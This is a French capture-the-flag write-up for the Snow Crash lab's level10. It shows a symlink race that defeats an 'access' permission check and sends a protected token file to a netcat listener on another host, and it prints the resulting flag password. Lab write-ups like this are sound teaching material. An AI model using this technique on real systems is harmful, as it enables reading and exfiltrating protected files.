@@ -1,0 +1,33 @@
+### Level10
+
+Nous avons découvert un exécutable binaire nommé 'level10', qui permet d'envoyer un fichier à un hôte. Le fichier 'token' doit être envoyé, mais il n'a pas les permissions nécessaires.
+Sur la machine hôte, nous avons configuré la réception du fichier en utilisant la commande 'netcat' avec l'option '-lk 6969' :
+
+	netcat -lk 6969
+
+Pour exploiter une faille de condition de course, nous allons bypasser la fonction 'access'.
+Le programme './level10' utilise 'access' pour vérifier les permissions du fichier à envoyer.
+Notre objectif est de créer un lien symbolique vers le fichier 'token' (qui n'a pas les permissions nécessaires) en utilisant la condition de course.
+
+Pour y parvenir, nous créons un script qui crée d'abord un lien symbolique sur un fichier avec les permissions adéquates, '/tmp/first' :
+
+	ln -sf /tmp/first /tmp/second
+
+Ensuite, nous créons un autre lien symbolique sur le fichier 'token' en utilisant '~/token' :
+
+	ln -sf ~/token /tmp/second
+
+Cela crée un lien symbolique nommé 'second' pointant vers 'first', puis un autre lien symbolique nommé 'second' pointant vers 'token'. Étant donné que le programme 'level10' s'exécute en boucle, il n'a qu'un court laps de temps pour vérifier les permissions du fichier à ouvrir. Le script permet de briser le lien symbolique de manière à ce qu'il pointe vers '~/token' au moment où nous exécutons 'level10'.
+
+Commande sur la machine 'snowcrash' :
+
+	./level10 /tmp/second 192.168.56.3
+
+Commande sur la machine hôte :
+
+	netcat -lk 6969
+
+En résultat, nous obtenons le mot de passe pour 'flag10' : "woupa2yuojeeaaed06riuj63c".
+On se connecte a flag10 et on execute :
+
+	getflag
